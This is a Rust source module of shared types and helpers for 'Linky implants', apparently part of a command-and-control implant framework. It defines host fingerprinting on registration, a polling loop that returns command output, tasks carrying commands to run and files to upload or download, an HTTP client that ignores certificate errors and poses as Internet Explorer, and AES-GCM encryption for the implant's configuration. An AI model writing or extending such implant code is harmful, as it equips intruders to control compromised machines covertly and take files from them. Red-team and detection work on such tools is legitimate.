// Common types and structures for Linky implants

/// Request sent during stage 2 (registration)
#[derive(serde::Serialize)]
pub struct RegisterRequest {
    pub link_username: String,
    pub link_hostname: String,
    pub internal_ip: String,
    pub external_ip: String,
    pub platform: String,
    pub pid: u32,
}

/// Request sent during stage 3 (callback)
#[derive(serde::Serialize)]
pub struct CallbackRequest<'a> {
    /// Output of the previously executed task (empty on first poll)
    pub q: &'a str,
    /// ID of the completed task (empty if none)
    pub tasking: &'a str,
}

/// Response from the server containing a task
#[derive(serde::Deserialize)]
pub struct TaskResponse {
    /// Command to execute (empty when idle)
    pub q: String,
    /// Task ID to track (empty when idle)
    pub tasking: String,
    /// Rolling request ID; implant must echo this on the next call
    pub x_request_id: String,
    /// For file download tasks, contains base64 encoded file content
    #[serde(default)]
    pub file: Option<String>,
    /// For file download tasks, contains the original file name
    #[serde(default)]
    pub filename: Option<String>,
    /// For file upload tasks, contains base64 encoded file content to upload
    #[serde(default)]
    pub upload: Option<String>,
    /// For file upload tasks, contains the destination path
    #[serde(default)]
    pub upload_path: Option<String>,
}

// ── HTTP client ────────────────────────────────────────────────────────────────

/// Build a reqwest client with common configuration
pub fn build_client() -> reqwest::blocking::Client {
    reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .user_agent("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
        .build()
        .expect("reqwest client init failed")
}

// ── Encryption ────────────────────────────────────────────────────────────────

/// Derive a 32-byte key from secret and salt using SHA-256
pub fn derive_key(secret: &str, salt: &str) -> [u8; 32] {
    use sha2::{Digest, Sha256};

    // Create a key by hashing the secret and salt
    let mut hasher = Sha256::new();
    hasher.update(secret.as_bytes());
    hasher.update(salt.as_bytes());

    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result[..32]);
    key
}

/// Encrypt configuration data using AES-256-GCM
pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };

    // Generate a random nonce (12 bytes for AES-GCM)
    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);

    // Create cipher instance
    let cipher = Aes256Gcm::new_from_slice(key).expect("Failed to create cipher");

    // Encrypt the data
    let ciphertext = cipher
        .encrypt(nonce, data.as_bytes())
        .expect("Encryption failure");

    // Combine nonce and ciphertext
    let mut result = Vec::with_capacity(nonce.len() + ciphertext.len());
    result.extend_from_slice(nonce);
    result.extend_from_slice(&ciphertext);

    // Return as hex string
    hex::encode(result)
}

/// Decrypt configuration data using AES-256-GCM
pub fn decrypt_config(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };

    // Decode hex string
    let encrypted_data = match hex::decode(encrypted_hex) {
        Ok(data) => data,
        Err(_) => return None,
    };

    // Split nonce and ciphertext (nonce is 12 bytes for AES-GCM)
    if encrypted_data.len() < 12 {
        return None;
    }

    let nonce = Nonce::from_slice(&encrypted_data[..12]);
    let ciphertext = &encrypted_data[12..];

    // Create cipher instance
    let cipher = match Aes256Gcm::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => return None,
    };

    // Decrypt the data
    match cipher.decrypt(nonce, ciphertext) {
        Ok(decrypted) => String::from_utf8(decrypted).ok(),
        Err(_) => None,
    }
}

// Re-export common types for convenience
pub use serde_json;
